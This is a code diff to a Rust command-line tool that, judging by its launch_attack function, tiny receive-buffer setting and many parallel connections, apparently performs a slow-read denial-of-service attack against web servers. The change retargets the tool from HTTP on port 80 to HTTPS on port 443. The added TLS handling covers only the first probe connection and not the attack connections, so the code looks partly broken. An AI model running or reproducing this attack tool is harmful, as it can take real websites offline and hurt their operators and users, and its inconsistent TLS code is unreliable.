@@ -2,15 +2,17 @@ extern crate futures;
 extern crate http;
 #[macro_use]
 extern crate structopt;
+extern crate native_tls;
 extern crate tokio;
 extern crate tokio_timer;
+extern crate tokio_tls;
 extern crate trust_dns_resolver;
 
 use futures::future::join_all;
 use futures::future::{loop_fn, Future, Loop};
 use http::Request;
+use native_tls::TlsConnector;
 use std::net::IpAddr;
-use std::net::Shutdown::Both;
 use std::net::SocketAddr;
 use std::time::Duration;
 use structopt::StructOpt;
@@ -29,7 +31,12 @@ struct Options {
     #[structopt(short = "p", long = "path", default_value = "/")]
     path: String,
 
-    #[structopt(short = "b", long = "recv-buffer-size", default_value = "2304", parse(from_str = "parse_recv_buffer_size"))]
+    #[structopt(
+        short = "b",
+        long = "recv-buffer-size",
+        default_value = "2304",
+        parse(from_str = "parse_recv_buffer_size")
+    )]
     recv_buffer_size: usize,
 
     #[structopt(short = "r", long = "read-len", default_value = "5")]
@@ -79,13 +86,15 @@ fn main() {
         return;
     }
 
-    let socket_addr = SocketAddr::new(ip_addr_option.unwrap(), 80);
-    let url: String = "http://".to_owned() + &socket_addr.ip().to_string() + ":"
+    let socket_addr = SocketAddr::new(ip_addr_option.unwrap(), 443);
+    let url: String = "https://".to_owned() + &socket_addr.ip().to_string() + ":"
         + &socket_addr.port().to_string();
 
     let mut futures = vec![];
 
+    let connector = TlsConnector::builder().unwrap().build().unwrap();
     let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
+
     tcp_stream
         .set_recv_buffer_size(options.recv_buffer_size)
         .unwrap();
@@ -96,14 +105,12 @@ fn main() {
         tcp_stream.recv_buffer_size().unwrap()
     );
 
-    tcp_stream.shutdown(Both).unwrap();
+    let mut tcp_stream = connector.connect(&options.address, tcp_stream).unwrap();
+
+    tcp_stream.shutdown().unwrap();
 
     for _ in 0..options.connections {
-        futures.push(launch_attack(
-            &socket_addr,
-            &url,
-            &options,
-        ));
+        futures.push(launch_attack(&socket_addr, &url, &options));
     }
 
     join_all(futures).wait().unwrap();
@@ -120,7 +127,9 @@ fn launch_attack(
 
     let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
 
-    tcp_stream.set_recv_buffer_size(options.recv_buffer_size).unwrap();
+    tcp_stream
+        .set_recv_buffer_size(options.recv_buffer_size)
+        .unwrap();
 
     let request = Request::get(url.to_owned() + path).body(()).unwrap();
     let request = build_http_request(&request);
